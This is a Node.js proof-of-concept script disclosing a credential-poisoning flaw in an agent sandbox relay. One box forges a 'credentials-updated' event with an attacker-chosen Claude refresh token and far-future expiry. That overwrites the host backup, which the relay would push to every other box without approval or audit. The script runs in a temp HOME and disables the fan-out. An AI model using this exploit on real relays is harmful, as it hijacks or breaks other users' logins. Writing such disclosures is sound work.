#!/usr/bin/env node
//
// PoC: Cross-box credential poisoning via the relay `credentials-updated` event
// ---------------------------------------------------------------------------
// Any box can POST /events {type:'credentials-updated', payload:{agent, contentBase64}}
// with its own bearer token. In host mode the relay runs CredentialsFanout.handle
// (server.ts:494), which:
//   * accepts the blob if parseCredentialsUpdate passes (claude only needs a
//     non-empty claudeAiOauth.refreshToken -- attacker-chosen), and
//   * shouldAcceptCredentialUpdate's "newest-wins" for claude keys on the
//     box-supplied claudeAiOauth.expiresAt -- so a far-future value always wins;
//   * OVERWRITES the host backup ~/.agentbox/claude-credentials.json, then
//   * spawns `agentbox credentials propagate --agent claude` (scope: all) which
//     pushes the blob into EVERY other box (docker volumes incl. paused, and
//     every running cloud box).
// No approval prompt, and the event is deliberately excluded from the audit ring.
//
// This PoC runs HOME in a temp dir (so it can't touch your real ~/.agentbox),
// seeds a legit backup, then -- as a box holding only its bearer token -- POSTs
// the event to the REAL relay and shows the host backup replaced with attacker
// content. AGENTBOX_CLI_ENTRY is left unset so the fan-out spawn only logs a
// failure instead of pushing into real boxes.
//
// Run: node poc.mjs   (needs `pnpm --filter @agentbox/relay... build`)

import { mkdtempSync, mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const WORK = mkdtempSync(join(tmpdir(), 'agentbox-cred-poc.'));
process.env.HOME = WORK;             // isolate ~/.agentbox to the sandbox
process.env.USERPROFILE = WORK;
delete process.env.AGENTBOX_CLI_ENTRY; // fan-out spawn will no-op (log a failure), not touch real boxes
mkdirSync(join(WORK, '.agentbox'), { recursive: true });

const { startRelayServer } = await import('../../../packages/relay/dist/index.js');
const { writeCredentialBackup, readCredentialBackup } = await import(
  '../../../packages/sandbox-core/dist/index.js'
);

const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const red = (s) => `\x1b[1;31m${s}\x1b[0m`;
const green = (s) => `\x1b[1;32m${s}\x1b[0m`;
const say = (s) => console.log(`\n${bold('== ' + s + ' ==')}`);
const info = (s) => console.log('   ' + s);

const BOX_TOKEN = 'box-token-' + '7'.repeat(40);
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64');
let accepted = null;
const logger = (line) => {
  const m = /credentials: accepted (\w+) update from box (\S+) \(([^)]+)\)/.exec(line);
  if (m) accepted = { agent: m[1], reason: m[3] };
};

async function main() {
  say('1. Seed the host backup with the user\'s REAL Claude login');
  const legit = { claudeAiOauth: { refreshToken: 'REAL-USER-REFRESH-TOKEN', expiresAt: Date.now() + 3_600_000 } };
  await writeCredentialBackup('claude', JSON.stringify(legit));
  const before = await readCredentialBackup('claude');
  info(`~/.agentbox/claude-credentials.json refreshToken = ${JSON.parse(before).claudeAiOauth.refreshToken}`);

  say('2. Boot the REAL relay + register a box');
  const relay = await startRelayServer({ port: 0, host: '127.0.0.1', mode: 'host', logger });
  const URL = `http://127.0.0.1:${relay.server.address().port}`;
  await fetch(`${URL}/admin/register-box`, {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ boxId: 'poc-box', token: BOX_TOKEN, name: 'poc', kind: 'docker' }),
  });
  info(`relay at ${URL}, box registered`);

  say('3. As the box (only its bearer token), POST a poisoned credentials-updated event');
  const poison = { claudeAiOauth: { refreshToken: 'ATTACKER-CONTROLLED-TOKEN', expiresAt: 99999999999999 } };
  info(`payload: claudeAiOauth.refreshToken="ATTACKER-CONTROLLED-TOKEN", expiresAt=99999999999999 (far future)`);
  const r = await fetch(`${URL}/events`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', authorization: `Bearer ${BOX_TOKEN}` },
    body: JSON.stringify({ type: 'credentials-updated', payload: { agent: 'claude', contentBase64: b64(poison) } }),
  });
  info(`POST /events -> HTTP ${r.status}`);
  await new Promise((res) => setTimeout(res, 200));

  say('4. Result');
  const after = await readCredentialBackup('claude');
  const nowTok = after ? JSON.parse(after).claudeAiOauth.refreshToken : '(none)';
  info(`host backup refreshToken is now: ${nowTok}`);
  info(`relay accepted the box's credential update: ${accepted ? `YES (${accepted.reason})` : 'no'}`);
  const ok = nowTok === 'ATTACKER-CONTROLLED-TOKEN';
  if (ok) {
    console.log('\n' + red('VULNERABLE') + " -- a box replaced the host's shared Claude credential backup with");
    info("attacker content, with no approval prompt. The relay then schedules");
    info("`agentbox credentials propagate --agent claude` (scope: all), pushing this blob into");
    info("every other box -- breaking their logins or forcing an attacker-chosen identity.");
  } else {
    console.log('\n' + green('NOT reproduced'));
  }
  await relay.close();
  rmSync(WORK, { recursive: true, force: true });
  process.exit(ok ? 0 : 1);
}
main().catch((e) => { console.error(e); rmSync(WORK, { recursive: true, force: true }); process.exit(2); });
